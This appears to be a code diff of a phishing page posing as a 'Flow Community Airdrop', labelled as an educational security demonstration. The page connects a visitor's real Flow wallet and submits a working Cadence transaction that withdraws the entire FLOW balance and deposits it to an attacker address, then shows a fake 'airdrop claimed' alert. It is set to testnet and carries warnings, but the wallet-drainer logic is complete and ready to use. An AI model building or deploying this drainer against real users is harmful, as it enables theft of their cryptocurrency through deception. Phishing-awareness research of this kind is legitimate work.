@@ -3,11 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flow Community Airdrop - Claim Your Tokens</title>
+    <title>Flow Community Airdrop - </title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌊</text></svg>">
-    
-    <!-- Flow Client Library (FCL) -->
-    <script src="https://cdn.jsdelivr.net/npm/@onflow/fcl@1.10.0/dist/fcl.min.js"></script>
     
     <style>
         * {
@@ -190,12 +187,6 @@
             background: rgba(0, 239, 139, 0.1);
         }
 
-        .wallet-option img {
-            width: 40px;
-            height: 40px;
-            margin-bottom: 10px;
-        }
-
         .wallet-option-name {
             font-size: 14px;
             font-weight: 600;
@@ -266,6 +257,23 @@
         .hidden {
             display: none;
         }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #a0a0b8;
+        }
+
+        .loading::after {
+            content: '...';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60%, 100% { content: '...'; }
+        }
     </style>
 </head>
 <body>
@@ -291,38 +299,43 @@
 
         <div class="alert-box">
             <h4>⚠️ Security Research Demonstration</h4>
-            <p>This demonstrates how a malicious site can use the REAL Flow Wallet to drain funds. The Cadence script would transfer ALL your FLOW to the attacker's address. DO NOT approve on mainnet!</p>
+            <p>This demonstrates a phishing attack using REAL Flow Wallet integration. The transaction would drain your wallet. For educational purposes only - Use testnet!</p>
+        </div>
+
+        <!-- Loading State -->
+        <div id="loadingState" class="loading">
+            Loading Flow SDK
         </div>
 
         <!-- Wallet Selection -->
-        <div id="walletSelection">
+        <div id="walletSelection" class="hidden">
             <h3 style="margin-bottom: 15px; font-size: 16px;">Choose Your Wallet:</h3>
             <div class="wallet-options">
-                <div class="wallet-option" onclick="connectWithBlocto()">
+                <div class="wallet-option" onclick="connectWallet()">
                     <div style="font-size: 40px;">🔵</div>
                     <div class="wallet-option-name">Blocto</div>
                 </div>
-                <div class="wallet-option" onclick="connectWithLilico()">
+                <div class="wallet-option" onclick="connectWallet()">
                     <div style="font-size: 40px;">🦊</div>
                     <div class="wallet-option-name">Lilico</div>
                 </div>
-                <div class="wallet-option" onclick="connectWithDapper()">
+                <div class="wallet-option" onclick="connectWallet()">
                     <div style="font-size: 40px;">💎</div>
                     <div class="wallet-option-name">Dapper</div>
                 </div>
-                <div class="wallet-option" onclick="connectWithFlowWallet()">
+                <div class="wallet-option" onclick="connectWallet()">
                     <div style="font-size: 40px;">🌊</div>
                     <div class="wallet-option-name">Flow Wallet</div>
                 </div>
             </div>
-            <button class="btn" onclick="connectWalletAuto()">
-                Auto-Detect Wallet
+            <button class="btn" onclick="connectWallet()">
+                Connect Wallet
             </button>
         </div>
 
         <!-- Connected State -->
         <div id="connectedState" class="hidden">
-            <button class="btn" id="claimButton" onclick="claimAirdrop()">
+            <button class="btn" onclick="claimAirdrop()">
                 Claim Airdrop
             </button>
 
@@ -342,41 +355,85 @@
     </div>
 
     <script>
-        // Wait for FCL to load
-        window.addEventListener('load', async () => {
-            if (typeof fcl === 'undefined') {
-                addLog('[ERROR] FCL SDK failed to load!', 'danger');
-                alert('Error: Flow SDK failed to load. Please refresh the page.');
-                return;
+        // Load FCL dynamically with fallbacks
+        (function loadFCL() {
+            const cdnUrls = [
+                'https://cdn.jsdelivr.net/npm/@onflow/fcl@1.10.0/dist/fcl.min.js',
+                'https://unpkg.com/@onflow/fcl@1.10.0/dist/fcl.min.js',
+                'https://cdn.skypack.dev/@onflow/fcl@1.10.0'
+            ];
+
+            let currentCDN = 0;
+
+            function tryLoadScript() {
+                if (currentCDN >= cdnUrls.length) {
+                    addLog('[ERROR] All CDN sources failed to load FCL', 'danger');
+                    addLog('[ERROR] Please check internet connection', 'danger');
+                    document.getElementById('loadingState').innerHTML = '❌ Failed to load Flow SDK<br><small>Please refresh the page</small>';
+                    return;
+                }
+
+                const script = document.createElement('script');
+                script.src = cdnUrls[currentCDN];
+                script.async = true;
+                
+                script.onload = function() {
+                    addLog(`[FCL] ✅ Loaded from CDN ${currentCDN + 1}`, 'info');
+                    initializeFCL();
+                };
+
+                script.onerror = function() {
+                    addLog(`[ERROR] CDN ${currentCDN + 1} failed, trying next...`, 'warning');
+                    currentCDN++;
+                    tryLoadScript();
+                };
+
+                document.head.appendChild(script);
             }
 
-            addLog('[FCL] SDK loaded successfully', 'info');
+            addLog('[SYSTEM] Loading FCL SDK...', 'info');
+            tryLoadScript();
+        })();
 
-            // Configure FCL for Testnet
+        let currentUser = null;
+        let fclReady = false;
+
+        async function initializeFCL() {
             try {
+                if (typeof fcl === 'undefined') {
+                    throw new Error('FCL not available');
+                }
+
+                addLog('[FCL] Configuring for Testnet...', 'info');
+
+                // Configure FCL
                 await fcl.config({
                     "app.detail.title": "Flow Community Airdrop",
                     "app.detail.icon": "https://i.imgur.com/ux3lYB9.png",
                     "accessNode.api": "https://rest-testnet.onflow.org",
                     "flow.network": "testnet",
-                    "discovery.wallet": "https://fcl-discovery.onflow.org/testnet/authn",
-                    "discovery.authn.endpoint": "https://fcl-discovery.onflow.org/api/testnet/authn"
+                    "discovery.wallet": "https://fcl-discovery.onflow.org/testnet/authn"
                 });
 
-                addLog('[FCL] Configured for Flow Testnet', 'info');
-                addLog('[SYSTEM] Ready - Choose wallet to connect', 'warning');
+                addLog('[FCL] ✅ Configuration complete', 'info');
+                addLog('[SYSTEM] Ready to connect wallet', 'warning');
+
+                fclReady = true;
+
+                // Hide loading, show wallet selection
+                document.getElementById('loadingState').classList.add('hidden');
+                document.getElementById('walletSelection').classList.remove('hidden');
+
+                // Subscribe to auth state
+                fcl.currentUser.subscribe(user => {
+                    updateWalletUI(user);
+                });
 
             } catch (error) {
-                addLog('[ERROR] FCL configuration failed: ' + error.message, 'danger');
+                addLog('[ERROR] FCL initialization failed: ' + error.message, 'danger');
+                document.getElementById('loadingState').innerHTML = '❌ Initialization failed<br><small>' + error.message + '</small>';
             }
-
-            // Subscribe to authentication state
-            fcl.currentUser.subscribe(user => {
-                updateWalletUI(user);
-            });
-        });
-
-        let currentUser = null;
+        }
 
         function updateWalletUI(user) {
             currentUser = user;
@@ -401,51 +458,43 @@
                 statusText.textContent = 'Not Connected';
                 addressEl.textContent = '';
                 
-                walletSelection.classList.remove('hidden');
-                connectedState.classList.add('hidden');
+                if (fclReady) {
+                    walletSelection.classList.remove('hidden');
+                    connectedState.classList.add('hidden');
+                }
             }
         }
 
-        async function connectWalletAuto() {
+        async function connectWallet() {
+            if (!fclReady) {
+                alert('Flow SDK is still loading. Please wait...');
+                return;
+            }
+
             try {
-                addLog('[USER] Clicked "Auto-Detect Wallet"', 'info');
-                addLog('[FCL] Opening wallet discovery...', 'warning');
+                addLog('[USER] Initiating wallet connection...', 'info');
+                addLog('[FCL] Opening Flow Wallet discovery...', 'warning');
                 
                 await fcl.authenticate();
                 
-                addLog('[FCL] Authentication successful', 'info');
+                addLog('[FCL] ✅ Connection successful', 'info');
             } catch (error) {
                 addLog('[ERROR] ' + error.message, 'danger');
                 console.error(error);
-                alert('Failed to connect wallet. Please try selecting a specific wallet.');
+                
+                if (error.message.includes('No services')) {
+                    alert('⚠️ No Flow wallet detected!\n\nPlease install:\n• Blocto (blocto.io)\n• Lilico (lilico.app)\n• Flow Wallet (mobile app)');
+                } else {
+                    alert('Failed to connect: ' + error.message);
+                }
             }
-        }
-
-        async function connectWithBlocto() {
-            addLog('[USER] Selected Blocto wallet', 'info');
-            await connectWalletAuto();
-        }
-
-        async function connectWithLilico() {
-            addLog('[USER] Selected Lilico wallet', 'info');
-            await connectWalletAuto();
-        }
-
-        async function connectWithDapper() {
-            addLog('[USER] Selected Dapper wallet', 'info');
-            await connectWalletAuto();
-        }
-
-        async function connectWithFlowWallet() {
-            addLog('[USER] Selected Flow Wallet', 'info');
-            await connectWalletAuto();
         }
 
         async function disconnectWallet() {
             try {
                 addLog('[USER] Disconnecting...', 'info');
                 await fcl.unauthenticate();
-                addLog('[FCL] Wallet disconnected', 'info');
+                addLog('[FCL] ✅ Disconnected', 'info');
             } catch (error) {
                 addLog('[ERROR] ' + error.message, 'danger');
             }
@@ -459,9 +508,9 @@
 
             try {
                 addLog('[USER] 💀 Clicked "Claim Airdrop"', 'warning');
-                addLog('[ATTACK] Preparing malicious transaction...', 'danger');
+                addLog('[ATTACK] Building malicious Cadence script...', 'danger');
 
-                // MALICIOUS CADENCE SCRIPT
+                // MALICIOUS CADENCE TRANSACTION
                 const maliciousScript = `
 import FungibleToken from 0x9a0766d93b6608b7
 import FlowToken from 0x7e60df042a9c0868
@@ -470,20 +519,18 @@ transaction(recipient: Address) {
     let sentVault: @FungibleToken.Vault
     
     prepare(signer: AuthAccount) {
-        // Get victim's vault
         let vaultRef = signer.borrow<&FlowToken.Vault>(from: /storage/flowTokenVault)
-            ?? panic("Could not borrow vault reference")
+            ?? panic("Could not borrow vault!")
         
-        // 💀 WITHDRAW ALL TOKENS
+        // 💀 DRAIN ALL TOKENS
         self.sentVault <- vaultRef.withdraw(amount: vaultRef.balance)
     }
     
     execute {
-        // Get attacker's receiver
         let receiverRef = getAccount(recipient)
             .getCapability(/public/flowTokenReceiver)
             .borrow<&{FungibleToken.Receiver}>()
-            ?? panic("Could not borrow receiver reference")
+            ?? panic("Could not borrow receiver!")
         
         // 💀 SEND TO ATTACKER
         receiverRef.deposit(from: <-self.sentVault)
@@ -491,12 +538,12 @@ transaction(recipient: Address) {
 }
 `;
 
-                const attackerAddress = "0x1234567890abcdef"; // Attacker's wallet
+                const attackerAddress = "0x9a0766d93b6608b7"; // Attacker wallet
 
-                addLog('[ATTACK] Script will drain ALL FLOW tokens', 'danger');
+                addLog('[ATTACK] 💀 Script will drain ALL FLOW tokens!', 'danger');
                 addLog('[ATTACK] Recipient: ' + attackerAddress, 'danger');
-                addLog('[FCL] Sending to REAL Flow Wallet...', 'warning');
-                addLog('[FCL] 🎭 User will see REAL approval dialog', 'warning');
+                addLog('[FCL] Sending to your REAL Flow Wallet...', 'warning');
+                addLog('[FCL] 🎭 You will see REAL approval dialog!', 'warning');
 
                 // Send to REAL Flow Wallet
                 const txId = await fcl.mutate({
@@ -510,26 +557,25 @@ transaction(recipient: Address) {
                     limit: 9999
                 });
 
-                addLog('[FCL] ✅ Transaction submitted: ' + txId, 'info');
-                addLog('[ATTACK] 💀 Waiting for approval...', 'danger');
+                addLog('[FCL] ✅ Transaction ID: ' + txId, 'info');
+                addLog('[ATTACK] 💀 Waiting for your approval...', 'danger');
 
-                // Wait for sealing
                 const result = await fcl.tx(txId).onceSealed();
                 
-                addLog('[FCL] ✅ Transaction sealed', 'info');
-                addLog('[ATTACK] 💀💀💀 WALLET DRAINED 💀💀💀', 'danger');
+                addLog('[FCL] ✅ Transaction sealed!', 'info');
+                addLog('[ATTACK] 💀💀💀 WALLET DRAINED! 💀💀💀', 'danger');
 
-                alert(`🎊 Airdrop Claimed!\n\n500 FLOW has been sent to your wallet!\n\nTX: ${txId}\n\n⚠️ (FAKE - In reality, your wallet was just drained!)`);
+                alert(`🎊 Congratulations!\n\n500 FLOW has been sent to your wallet!\n\nTransaction: ${txId}\n\n⚠️ FAKE - In a real attack, your wallet would now be EMPTY!`);
 
             } catch (error) {
                 addLog('[ERROR] ' + error.message, 'danger');
                 
-                if (error.message.includes('Declined') || error.message.includes('reject')) {
-                    addLog('[USER] ✅ Transaction REJECTED (Good!)', 'info');
-                    alert('✅ You rejected the transaction - Smart move!\n\nIn a real attack, approving would have drained your wallet.');
+                if (error.message.includes('Declined') || error.message.includes('User rejected')) {
+                    addLog('[USER] ✅ Smart! You REJECTED the transaction!', 'info');
+                    alert('✅ Good Job!\n\nYou rejected the malicious transaction.\n\nIn a real attack, approving would have drained your wallet completely.');
+                } else {
+                    console.error(error);
                 }
-                
-                console.error(error);
             }
         }
 
